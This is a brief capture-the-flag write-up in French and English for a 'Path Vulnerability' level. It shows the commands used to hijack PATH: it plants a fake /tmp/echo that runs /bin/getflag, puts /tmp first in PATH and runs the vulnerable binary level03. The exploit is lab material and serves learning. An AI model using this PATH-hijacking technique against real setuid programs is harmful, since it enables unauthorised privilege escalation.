# Défi 3 Path Vulnerability

### Commandes réalisées
```bash
ls -la
ltrace ./level03
echo '/bin/getflag' > /tmp/echo; chmod +x /tmp/echo; export PATH=/tmp:$PATH; ./level03
```
* [[ltrace vs ptrace]]

### Utilisation d'echo via /usr/bin/env

**/usr/bin/env** -> signifie que echo est cherché dans **PATH**

### Méthods
#### 1. Create a /tmp/echo
#### 2. chmod +x /tmp/echo
#### 3. Add path to PATH variable